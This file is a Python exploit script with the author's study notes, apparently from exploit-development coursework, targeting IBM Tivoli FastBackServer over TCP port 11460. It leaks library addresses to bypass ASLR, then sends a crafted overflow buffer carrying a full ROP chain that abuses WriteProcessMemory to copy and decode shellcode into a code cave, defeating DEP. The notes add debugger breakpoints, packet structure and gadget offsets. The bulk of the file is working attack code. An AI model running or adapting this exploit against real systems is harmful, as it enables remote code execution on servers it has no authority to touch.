r"""
=============================================================================
=========================== - Breakpoints (Old) - ===========================
=============================================================================
        bp wsock32!recv
        bp FastBackServer!FX_AGENT_CopyReceiveBuff+0x1f6
        bp FastBackServer!FX_AGENT_Cyclic+0xD0
        bp FastBackServer!FXCLI_OraBR_Exec_Command
        bp FastBackServer!FXCLI_OraBR_Exec_Command+0x43b
        bp FastBackServer!FXCLI_OraBR_Exec_Command+0x4c7
        bp FastBackServer!FXCLI_OraBR_Exec_Command+0x6ac
        bp FastBackServer!FXCLI_SetConfFileChunk+0x40

=============================================================================
============================== - Breakpoints - ==============================
=============================================================================
    bp FastBackServer!FXCLI_OraBR_Exec_Command+0xd43    OpCode=0x2000
    bp FastBackServer!FXCLI_DebugDispatch+0xcc9         SymbolOperation
    bp FastBackServer!FXCLI_DebugDispatch+0xe04         SymGetSymFromName
    bp FastBackServer!FXCLI_OraBR_Exec_Command+0x7374   ReturnValue
    bp FastBackServer!FXCLI_OraBR_Exec_Command+0x96ac   ReturnValue
    bp FastBackServer!FXCLI_OraBR_Exec_Command+0x9877   BufferSend

=============================================================================
======================== - Packet/Buffer Structure - ========================
=============================================================================
        0x00       : Checksum DWORD
        0x04 - 0x34: psAgentCommand
                    - 0x04 - 0xC:   ??
                    - 0x10:         Opcde
                    - 0x14:         Offset for copy operation
                    - 0x18:         Size of copy operation
                    - 0x1C:         Offset for 2nd copy operation
                    - 0x20:         Size of 2nd copy operation
                    - 0x24:         Offset for 3rd copy operation
                    - 0x28:         Size of 3rd copy operation
                    - 0x2C - 0x34:  ??
        0x34 - End:  psCommandBuffer

=============================================================================
================================= - Notes - =================================
=============================================================================
Same func as before (FXCLI_OraBR_Exec_Command)

using a win32 api import from dbghelp.dll

function: SymGetSymFromName

FXCLI_OraBR_Exec_Command Opcode: 0x2000

BOOL IMAGEAPI SymGetSymFromName(
    [in]      HANDLE           hProcess,
    [in]      PCSTR            Name,
    [in, out] PIMAGEHLP_SYMBOL Symbol
);

typedef struct _IMAGEHLP_SYMBOL {
    DWORD SizeOfStruct;
    DWORD Address;
    DWORD Size;
    DWORD Flags;
    DWORD MaxNameLength;
    CHAR Name[1];
} IMAGEHLP_SYMBOL, *PIMAGEHLP_SYMBOL;

SymbolOperation resolves WinAPIs and stores the
results in the psCommandBuffer


getIPAddr&Port -> gets existing TCP conn to send info back to
                  switched existing connection type to recieve buffer

01b30000 01b5b000
gsk8iccs C:\Program Files\ibm\gsk8\lib\gsk8iccs.dll

01b60000 01b9a000
icclib019 C:\Program Files\ibm\gsk8\lib\N\icc\icclib\icclib019.dll

02f80000 03070000
libeay32IBM019 C:\Program Files\ibm\gsk8\lib\N\icc\osslib\libeay32IBM019.dll

Using IBM DLLs, we can ensure that our exploit is at least only tivoli
version dependent, and not dependent on windows versions

Rule of Thumb (RoT) for choosing modules is to ensure the upper bytes are
not 00, all 3 are fine here, ill use libeay32IBM019 as its the highest out
of the 3 modules

analyzing the library, an exported func `N98E_CRYPTO_get_new_lockid` has
an offset of +14E0 with an ordinal of 1026

by subtracting this offset from the leaked address of the func, we get the
base addr of the lib. this is aslr bypass

now to bypass DEP as ASLR is used in tandem to enhance DEP, we need to do
what was done before via VirtualAlloc and ROP gadgets, but this time we'll
use WriteProcessMemory to copy our code from the stack to the code
(text section)page of our target library

BOOL WriteProcessMemory(
  HANDLE  hProcess,
  LPVOID  lpBaseAddress,
  LPCVOID lpBuffer,
  SIZE_T  nSize,
  SIZE_T  *lpNumberOfBytesWritten
);

now to find code caves, i.e. padding bytes
0x3c from MZ header -> PE Header
0x2c from PE header -> offset to code section

0:078> ? libeay32IBM019 + 1000
03141000

now to analyze the code section
!address 03141000

Usage:                  Image
Base Address:           03141000
End Address:            031d3000
Region Size:            00092000 ( 584.000 kB)
State:                  00001000          MEM_COMMIT
Protect:                00000020          PAGE_EXECUTE_READ
Type:                   01000000          MEM_IMAGE
Allocation Base:        03140000
Allocation Protect:     00000080          PAGE_EXECUTE_WRITECOPY


This can also be done with !dh, we just need to take the upper bound of the
code section and subtract it with a very large enough value to store our
shellcode

the book only subtracted 0x400, but ive seen that 0x900 is also good enough
00000c00


note: this is very confusing to follow while working with brain fog

lib: libeay32ibm019
offset1: 0x3c                                 <- gets us to PE header
offset2: 0x2c + offset1                       <- offset of code section
CS->libeay32ibm019: baseAddress + offset1     <- Code Section
then

libeay32ibm019 baseAddress + offset2 gets us to the code section

then

we use the END_ADDRESS of the code section
    - take away 0x400 bytes to make space for our code

now

to get the offset for this, we
    - END_ADDRESS - baseAddress - 0x400 (This gives offset from baseAddress to the code cave)

ENSURE: offset does not have any null bytes


just realized, this is needless. can use pykd to automate locating code caves
wrote locateCodeCaves.py, stored in /windbg_tools


after code caves we can abuse WPM to copy our shellcode from the overflown opCode
buffer to an executable page in memory

WPM takes
- hProcess 			        <- Set to -1, stay within currentProc
- lpBaseAddress			    <- Addr to write to (BaseAddr + Offset)
- lpBuffer			        <- Shellcode stack Addr
- nSize				        <- Shellcode Size
- lpNumberOfBytesWritten	<- DWORD in the .data section


Now ROP gadgets have to be offset based
to get image base
baseDLLAddr + 3c -> PE Header
baseDLLAddr + PEHeader + 34 -> ImageBase


0253-03242026:

0934-03252026:
11.4.3 Handmade rop decoder
wrote new module called shellcode.py
already added a map to swap out bad chars for good chars
gonna follow the book along to figure out how to use ROP for decoding\\

1238-03252026:
the vid uses an offset of 0x61e, but mine is just 0x11f
offset for eax to first bad char

1622-07272026:
took a long break, feel sick today still
recover knowledge

1328-07282026:
- DEP + ASLR was disabled for FBS for some silly reason
- IDA was used to explore FXCLI_DebugDispatch, FXCLI_OraBR_Exec_Command 
  & N98E_CRYPTO_get_new_lockid
    - N98E_CRYPTO_get_new_lockid is used to leak the base address 
      of libeay32ibm019
    - FXCLI_DebugDispatch is used to resolve WinAPI functions, 
      such as WriteProcessMemory
    - FXCLI_OraBR_Exec_Command is used to send the final buffer to 
      the server, which will trigger the ROP chain and execute the shellcode

2258-02082026:
- Got my desk setup, do not have enough time to get much work done however
- Ran the script, got 0x42424242 on EIP, unsure what part of the 42 chain is on EIP
- rest for tomorrow

1303-03082026:
- First 0x42424242 reveals stack is misaligned, check it when back
=============================================================================

"""

import argparse
import socket
import struct
import sys
from struct import pack

from colorama import Back, Fore, Style, init
from modules.msfvenom_module import generatePayload
from modules.shellcode import getShellcode

DEBUG = True
BASE_ADDR_BAD = False
init()


bad_chars = [0x00, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x20]


def log(msg: str, indent: int = 0, level: str = "*"):
    """Prints a message with a given indentation and log level."""
    indent_str = "\t" * indent
    level_map = {
        "+": ("[+]", Fore.GREEN),
        "-": ("[-]", Fore.RED),
        "!": ("[!]", Fore.YELLOW),
        "!!!": ("[!!!]", Fore.LIGHTRED_EX),
        "*": ("[*]", Fore.CYAN),
    }
    prefix, color = level_map.get(level, (f"[{level}]", Fore.WHITE))
    print(f"{color}{indent_str}{prefix} {msg}{Style.RESET_ALL}")


def checkBadChars(data):
    # Iterate over bytes in the data and check for bad characters
    for byte in data:
        if byte in bad_chars:
            return True
    return False


def checkNullBytes(data) -> bool:
    """Check if the given data contains null bytes. Iterate 0x00 at a time and return True if found, else False. Ensures bytes are read in groups of 2"""
    for i in range(0, len(data), 2):
        if data[i : i + 2] == b"\x00\x00":
            return False
    return True


DEBUG_Response = False


def sendMalBuff(buf, socketTup, DEBUG_Response=False):
    timeout_seconds = 5
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(timeout_seconds)
            s.connect(socketTup)

            # Check buffer for bad chars
            if checkBadChars(buf):
                log("Buffer contains bad characters", level="!")

            # Send the buffer to the server
            s.sendall(buf)
            if DEBUG_Response:
                printBuffer(buf, width="dd")
                log(f"Sent {len(buf)} bytes successfully!", level="+")

            # Print out response from server
            if DEBUG_Response:
                log("Waiting for response from server...", level="*")
            response = b""
            while True:
                try:
                    chunk = s.recv(1024)
                    if DEBUG_Response:
                        log(f"Received chunk: {chunk}", level="!!!")
                except socket.timeout:
                    break
                if not chunk:
                    break
                response += chunk
                if b"Address is:" in response:
                    break

            if not response:
                log("No response received from server", level="-")
                sys.exit(1)

            return response

    except socket.timeout:
        log("Socket operation timed out", level="-")
        sys.exit(1)
    except socket.error as error:
        log(f"Socket error: {error}", level="-")
        sys.exit(1)


def leakFunctionAddress(func, socketTup):

    log(f"Attempting to leak address for {func.decode('utf-8').strip(chr(0))}...", level="*")
    # Append SymbolOperation to the Func
    symOpFunc = b"SymbolOperation" + func

    # Checksum
    buf = bytearray()

    # psAgentCommand
    buf += bytearray([0x41] * 0xC)  # psAgentCommand        0x04 - 0x34
    buf += pack("<i", 0x2000)  # Opcode                0x10
    buf += pack("<i", 0x0)  # 1st memcpy: offset    0x14
    buf += pack("<i", 0x100)  # 1st memcpy: size      0x18
    buf += pack("<i", 0x100)  # 2nd memcpy: offset    0x1C
    buf += pack("<i", 0x100)  # 2nd memcpy: size      0x20
    buf += pack("<i", 0x200)  # 3rd memcpy: offset    0x24
    buf += pack("<i", 0x100)  # 3rd memcpy: size      0x28
    buf += bytearray([0x41] * 0x8)  # N/A                   0x2C - 0x34

    # psCommandBuffer
    buf += symOpFunc + b"A" * (0x100 - len(symOpFunc))
    buf += b"B" * 0x100
    buf += b"C" * 0x100

    # Checksum
    buf = pack(">i", len(buf) - 4) + buf

    response = sendMalBuff(buf, socketTup, DEBUG_Response=False)
    if response:
        # Should have a valid response, parse it and get the address
        functionAddress = parseResponse(response)
        log(f"Leaked {func.decode('utf-8').strip(chr(0))}: 0x{functionAddress:08x}", level="+")

        if functionAddress == 1:
            log(f"Failed to leak address for {func.decode('utf-8').strip(chr(0))}", level="-")
            sys.exit(1)
    else:
        log(f"No response received from server when leaking {func.decode('utf-8').strip(chr(0))}", level="-")
        sys.exit(1)
    # Return the address only
    return functionAddress


def printBuffer(buf, width="db"):
    if width == "db":
        w = 1
        groups_per_line = 16
    elif width == "dw":
        w = 2
        groups_per_line = 8
    elif width == "dd":
        w = 4
        groups_per_line = 4
    else:
        log(f"Invalid width {width}", level="-")
        exit(-1)
    bytes_per_line = groups_per_line * w
    for i in range(0, len(buf), bytes_per_line):
        print(
            Fore.YELLOW + f"\t" + f"{i:04x} - {min(i+bytes_per_line, len(buf)):04x}: " + Style.RESET_ALL,
            end="",
        )
        for g in range(groups_per_line):
            start = i + g * w
            if start >= len(buf):
                break
            if width == "db":
                for j in range(w):
                    if start + j < len(buf):
                        byte_val = buf[start + j]
                        if byte_val in bad_chars:
                            print(f"{Fore.RED}{Back.WHITE}{byte_val:02x}{Style.RESET_ALL}", end=" ")
                        else:
                            print(f"{byte_val:02x}", end=" ")
                    else:
                        print("  ", end="")
            else:
                val = 0
                bad_in_group = False
                for j in range(w):
                    if start + j < len(buf):
                        val |= buf[start + j] << (8 * (w - 1 - j))
                        if buf[start + j] in bad_chars:
                            bad_in_group = True
                if width == "dw":
                    if bad_in_group:
                        print(f"{Fore.RED}{Back.WHITE}{val:04x}{Style.RESET_ALL}", end=" ")
                    else:
                        print(f"{val:04x}", end=" ")
                elif width == "dd":
                    if bad_in_group:
                        print(f"{Fore.RED}{Back.WHITE}{val:08x}{Style.RESET_ALL}", end=" ")
                    else:
                        print(f"{val:08x}", end=" ")
        # Add ASCII representation
        print(" ", end="")
        for j in range(bytes_per_line):
            idx = i + j
            if idx < len(buf):
                byte_val = buf[idx]
                if 32 <= byte_val <= 126:
                    print(chr(byte_val), end="")
                else:
                    print(".", end="")
            else:
                print(" ", end="")
        print()


def parseResponse(response):
    """Parse a server response and extract the leaked address"""
    pattern = b"Address is:"
    address = None
    for line in response.split(b"\n"):
        if line.find(pattern) != -1:
            address = int((line.split(pattern)[-1].strip()), 16)
    if not address:
        log("Could not find the address in the Response", level="-")
        sys.exit()
    return address


def parse_args():
    parser = argparse.ArgumentParser(description="Send a crafted buffer to the target service")
    parser.add_argument("ip", help="Target IP address")
    return parser.parse_args()


def repeat_bytes(pattern, length):
    if isinstance(pattern, str):
        pattern = bytes.fromhex(pattern.replace("0x", ""))

    if not pattern:
        raise ValueError("Pattern cannot be empty")

    return (pattern * ((length + len(pattern) - 1) // len(pattern)))[:length]


def main():
    global BASE_ADDR_BAD
    args = parse_args()
    server = args.ip
    port = 11460

    log(f"IP Addr: {server}:{port}", level="*")

    try:
        functions = [b"N98E_CRYPTO_get_new_lockid" + b"\x00", b"WriteProcessMemory" + b"\x00"]
        leakedAddresses = []

        """
        ************************************************************************************
        ******************************* ASLR Bypass Start***********************************
        ************************************************************************************
        """
        # Leak addresses of functions
        for func in functions:
            # If addr is good i.e. no null bytes, append to list, else exit
            leakedAddress = leakFunctionAddress(func, (server, port))

            if checkNullBytes(pack("<L", leakedAddress)):
                leakedAddresses.append(leakedAddress)
            else:
                log(f"Leaked address for {func.decode('utf-8').strip(chr(0))} contains null bytes {hex(leakedAddress)}", level="-")
                sys.exit(1)

        WPMAddr = leakedAddresses[1]  # WriteProcessMemory address
        exportedFunc = leakedAddresses[0]  # N98E_CRYPTO_get_new_lockid address

        # Target Function Offset observed from loading the dll in IDA was noted
        functionOffset = 0x14E0

        libeay32ibm019 = exportedFunc - functionOffset

        # # If our base address is not favorable, log it and exit
        # BASE_ADDR_BAD = checkBadChars(pack("<L", libeay32ibm019))
        # if BASE_ADDR_BAD:
        #     log(
        #         f"Calculated library base via\n\t\t{functions[0].decode('utf-8')}: {str(hex(libeay32ibm019))} contains bad chars",
        #         level="-",
        #     )
        #     sys.exit(1)

        log(
            f"Calculated library base via\n\t\t{functions[0].decode('utf-8')}: {str(hex(libeay32ibm019))}",
            level="+",
        )

        """
        ************************************************************************************
        ******************************* Stage 0: ROP Gadgets *******************************
        ************************************************************************************
        """
        rop_inc_eax_ret = pack("<L", (libeay32ibm019 + 0x0000BC79))  # inc eax; ret [!!!] Verified
        rop_neg_eax_ret = pack("<L", (libeay32ibm019 + 0x0001D8C2))  # neg eax ; ret [!!!] Verified
        rop_pop_eax_ret = pack("<L", (libeay32ibm019 + 0x00048DB7))  # pop eax; ret [!!!] Verified
        rop_pop_ecx_ret = pack("<L", (libeay32ibm019 + 0x000010C2))  # pop ecx; ret [o] Corrected
        rop_add_eax_ecx_ret = pack("<L", (libeay32ibm019 + 0x0001D0F0))  # add eax, ecx; ret [!!!] Verified
        rop_xchg_eax_esp_ret = pack("<L", (libeay32ibm019 + 0x0003A003))  # xchg eax, esp ; ret [!!!] Verified
        rop_mov_ptrEAX_ecx_ret = pack("<L", (libeay32ibm019 + 0x00001F7E))  # mov dword [eax], ecx ; ret [!!!] Verified
        rop_add_ptrEAX_1_bh_ret = pack("<L", (libeay32ibm019 + 0x0003F8F4))  # add byte [eax+0x00000001], bh ; ret [o] Corrected
        rop_push_eax_pop_esi_ret = pack("<L", (libeay32ibm019 + 0x000408DD))  # push eax; pop esi; ret [!!!] Verified
        rop_push_esp_pop_esi_ret = pack("<L", (libeay32ibm019 + 0x000408D6))  # push esp; pop esi; ret <- Save ESP to ESI [!!!] Verified
        rop_sub_eax_ecx_pop_ebx_ret = pack("<L", (libeay32ibm019 + 0x0004A7B6))  # sub eax, ecx; pop ebx; ret [!!!] Verified
        rop_mov_eax_esi_pop_esi_ret = pack("<L", (libeay32ibm019 + 0x00002541))  # mov eax, esi; pop esi; ret  | Save ESP to EAX+ESI [o] Corrected
        rop_int3_int3_int3_int3_ret = pack("<L", (libeay32ibm019 + 0x00087E3C))  #  int3; int3; int3; int3; ret; <- debugging [o] Corrected
        rop_mov_ecx_eax_mov_eax_esi_pop_esi_ret_0x10 = pack(
            "<L", (libeay32ibm019 + 0x0008876D)
        )  # mov ecx, eax ; mov eax, esi ; pop esi ; retn 0x0010 [!!!] Verified
        """
        ************************************************************************************
        ************************************ Abuse WPM *************************************
        ************************************************************************************
        """
        # Init Buffer
        buf = bytearray()

        # psAgentCommand
        buf += bytearray([0x41] * 0xC)
        buf += pack("<i", 0x534)  # opcode
        buf += pack("<i", 0x0)  # 1st memcpy: offset
        buf += pack("<i", 0x1100)  # 1st memcpy: size field
        buf += pack("<i", 0x0)  # 2nd memcpy: offset
        buf += pack("<i", 0x100)  # 2nd memcpy: size field
        buf += pack("<i", 0x0)  # 3rd memcpy: offset
        buf += pack("<i", 0x100)  # 3rd memcpy: size field
        buf += bytearray([0x41] * 0x8)

        # psCommandBuffer
        # NOTE:: My code cave is larger than the book's 0x400
        #        which is why the offset is lower than 0x92c04
        #        (0x880B0)
        codeCaveOffset = 0x880B0
        wpm = pack("<L", (WPMAddr))  # WriteProcessMemory Address
        wpm += pack("<L", (libeay32ibm019 + codeCaveOffset))  # Shellcode Return Address
        wpm += pack("<L", (0xFFFFFFFF))  # pseudo Process handle
        wpm += pack("<L", (libeay32ibm019 + codeCaveOffset))  # Code cave address
        wpm += pack("<L", (0x41414141))  # dummy lpBuffer (Stack address)
        wpm += pack("<L", (0xCCCCCCCC))  # dummy nSize
        wpm += pack("<L", (libeay32ibm019 + 0xE401C))  # lpNumberOfBytesWritten = libBase + offset of writable DWORD in .data
        wpm += b"A" * 0x10

        offset = b"A" * (276 - len(wpm))
        # 1803_1011 (IGNORE, fixed):
        # Well, something is up with how the PPR gadget is being handled, i lose my 0x030d08d6 for 0x050008d6
        # 030d -> 0500
        #
        # the lower 4 bytes are fine, but the upper 4 are being fked with.
        # i need to subtract 0x01f30000 or add 0xfe0cffff if i want my original gadget back
        # ====== Stack layout ======
        # ROP: push int3*5; ret
        # 0xfe0cffff
        # pop reg | add popReg, reg, push popReg; ret
        # should have -> ROP: push esp; pop esi; ret
        #
        # IGNORE THE ABOVE. REASON:
        #                         restarting the PC gave me a new base address and so now it works as expected
        # eip = pack("<L", (libeay32ibm019 + 0x00087E3B))  # (0x03117e3b) int3; int3; int3; int3; int3; ret; <- debugging
        eip = rop_push_esp_pop_esi_ret  # <- Save ESP to ESI
        # eip = rop_int3_int3_int3_int3_ret  # <- Debugging
        # eip = pack("<L", (0x41424345))  # push esp; pop esi; ret <- Save ESP to ESI

        # ! DEBUG: eip: 0x030d08d6
        # DD DD DD DD
        # DD DD DD D6
        # DD DD D8 D6
        # DD DD 08 D6
        # DD 0D 08 D6   <- this broke the flow, got 00 00 08 D6

        # eip = pack("<L", (0xDD0D08D6))  # push esp; pop esi; ret <- Save ESP to ESI
        log(f"DEBUG: sent_eip: {hex(struct.unpack('<L', eip)[0])}", level="!!!")

        """
        ************************************************************************************
        ***************************** Stage 1a: Patch lpBuffer *****************************
        ************************************************************************************
        """

        # Patching lpBuffer, need it to point to our shellcode address on stack
        rop = rop_mov_eax_esi_pop_esi_ret  # mov eax, esi; pop esi; ret  | Save ESP to EAX+ESI
        rop += rop_int3_int3_int3_int3_ret
        rop += pack("<L", (0x42424242))  # dummy value
        rop += rop_pop_ecx_ret  # pop ecx; ret
        rop += pack("<L", (0x88888888))  # push huge value to "subtract"
        rop += rop_add_eax_ecx_ret  # -> this will set lpBuffer to point to our shellcode on the stack (EAX - 0x77777D78)
        rop += rop_pop_ecx_ret  # pop ecx; ret
        rop += pack("<L", (0x77777D78))
        rop += rop_add_eax_ecx_ret  # add eax, ecx; ret

        """
        ************************************************************************************
        ********************** Stage 1b: Patch lpNumberOfBytesWritten **********************
        ************************************************************************************
        """
        # 1603_0303:
        rop += rop_mov_ecx_eax_mov_eax_esi_pop_esi_ret_0x10  # mov ecx, eax ; mov eax, esi ; pop esi ; retn 0x0010
        rop += pack("<L", (0x42424242))  # junk into esi
        rop += rop_pop_eax_ret  # pop eax ; ret
        rop += pack("<L", (0x42424242))  # junk for ret 0x10
        rop += pack("<L", (0x42424242))  # junk for ret 0x10
        rop += pack("<L", (0x42424242))  # junk for ret 0x10
        rop += pack("<L", (0x42424242))  # junk for ret 0x10
        rop += pack("<L", (0xFFFFFEE0))  # pop into eax
        rop += rop_add_eax_ecx_ret  # add eax, ecx ; ret
        rop += rop_mov_ptrEAX_ecx_ret  # mov [eax], ecx ; ret

        """ 
        ************************************************************************************
        ****************************** Stage 1c: Patch nSize *******************************
        ************************************************************************************
        """
        # 1803_1046:
        # Patching nSize arg
        rop += rop_inc_eax_ret  # inc eax; ret
        rop += rop_inc_eax_ret  # inc eax; ret
        rop += rop_inc_eax_ret  # inc eax; ret
        rop += rop_inc_eax_ret  # inc eax; ret
        rop += rop_push_eax_pop_esi_ret  # push eax; pop esi; ret
        rop += rop_pop_eax_ret  # pop eax; ret
        rop += pack("<L", (0xFFFFFDF4))  # -524
        rop += rop_neg_eax_ret  # neg eax ; ret
        rop += rop_mov_ecx_eax_mov_eax_esi_pop_esi_ret_0x10  # mov ecx, eax ; mov eax, esi ; pop esi ; retn 0x0010
        rop += pack("<L", (0x42424242))  # junk into esi
        # rop += pack("<L", (libeay32ibm019 + 0x00087E3B))  # (0x03117e3b) int3; int3; int3; int3; int3; ret; <- debugging
        rop += rop_mov_ptrEAX_ecx_ret  # mov [eax], ecx ; ret
        rop += pack("<L", (0x42424242))  # junk for ret 0x10
        rop += pack("<L", (0x42424242))  # junk for ret 0x10
        rop += pack("<L", (0x42424242))  # junk for ret 0x10
        rop += pack("<L", (0x42424242))  # junk for ret 0x10

        """
        ************************************************************************************
        *************************** Stage 1d: Shellcode Decoding ***************************
        ************************************************************************************
        """
        rop += rop_int3_int3_int3_int3_ret  # int3; int3; int3; int3; int3; ret; <- debugging
        rop += rop_pop_ecx_ret  # pop ecx ; ret
        rop += pack("<L", (0xFFFFFFFF))  # negative offset -1
        rop += rop_sub_eax_ecx_pop_ebx_ret  # sub eax, ecx; pop ebx; ret
        rop += pack("<L", (0x11110111))  # Load 0x01 in BH -> The original value of the char we needed to replace
        rop += rop_add_ptrEAX_1_bh_ret  # add [eax+1], bh; ret

        """
        ************************************************************************************
        ******************************** Stage 1e: Align ESP *******************************
        ************************************************************************************
        """
        # 18032026_1057:
        # Align ESP with ROP Skeleton
        # EAX points 0x14 bytes ahead of WPM on stack
        # This will jump EIP back straight up towards the WPM address call
        rop += rop_pop_ecx_ret  # pop ecx ; ret
        rop += pack("<L", (0xFFFFFFEC))  # -0x14
        rop += rop_add_eax_ecx_ret  # add eax, ecx ; ret
        rop += rop_xchg_eax_esp_ret  # xchg eax, esp ; ret

        """
        ************************************************************************************
        **************************** Stage 2: Shellcode Encoding ***************************
        ************************************************************************************
        """
        # 0257_03242026:
        # Start of 11.4.2
        # alr know meterpreter shellcode wont run here, just reading through all this
        # REASON:: mfsvenom uses a Encoder/Decoder to avoid badchars. This requires the use of writeable memory
        #          which is not available in this case as WPM restores the default protections which were read/exec
        offset2 = b"C" * (0x600 - len(rop))  # This was calculated by subtracting lpBuffer address to the end of our ROP chain
        shellcode = getShellcode(encoded=True)[:20]  # Get encoded shellcode, moving forward we will be using the encoded shellcode

        log("Encoded Shellcode", level="+")
        printBuffer(shellcode, width="db")

        # SHELLCODE ENCODING:
        # The ropchain to decode the shellcode is to be placed before the ESP alignment section

        # Padding (Followed the vid)
        # padding = b"D" * (0x1000 - 276 - 4 - len(rop) - len(offset2) - len(shellcode))
        # TEST CODE
        padding_len = 0x1000 - 276 - 4 - len(rop) - len(offset2) - len(shellcode)
        padding = repeat_bytes("DEADC0DE", padding_len)

        # Prepare buffer + add checksum
        buffer = offset + wpm + eip + rop + offset2 + shellcode + padding
        buf += b"File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d" % (buffer, 0, 0, 0, 0)
        buf = pack(">i", len(buf) - 4) + buf  # Checksum DWORD        0x00 - 0x04

        # Send Final Buffer
        log("Sending final buffer...", level="*")
        sendMalBuff(buf, (server, port), DEBUG_Response=True)

    except KeyboardInterrupt:
        log("User requested shutdown", level="-")
        return 1


if __name__ == "__main__":
    sys.exit(main())
